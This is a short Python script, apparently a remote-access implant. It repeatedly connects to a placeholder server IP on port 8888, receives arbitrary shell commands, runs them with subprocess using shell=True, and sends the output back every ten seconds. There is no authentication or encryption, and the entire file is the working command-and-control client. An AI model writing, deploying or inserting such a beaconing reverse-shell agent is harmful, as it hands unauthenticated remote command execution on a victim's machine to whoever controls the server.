import asyncio
import subprocess
import time

sleep = 10
server_ip = '<server_ip>'
port = 8888


async def execute_command():
    # Read command and execute
    reader, writer = await asyncio.open_connection(server_ip, port)
    data = await reader.read(100)
    message = data.decode()
    # Execute command on client
    # https://stackoverflow.com/questions/17742789/running-multiple-bash-commands-with-subprocess
    try:
        process = subprocess.Popen(message, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        results = process.communicate(timeout=20)[0].strip()
    except subprocess.TimeoutExpired:
        results = "Command Timed out".encode()
    # Return results to server
    finally:
        writer.write(results)
        await writer.drain()
        writer.close()

while True:
    try:
        asyncio.run(execute_command())
        time.sleep(sleep)
    except KeyboardInterrupt:
        print("\nReceived exit, exiting")
        exit()
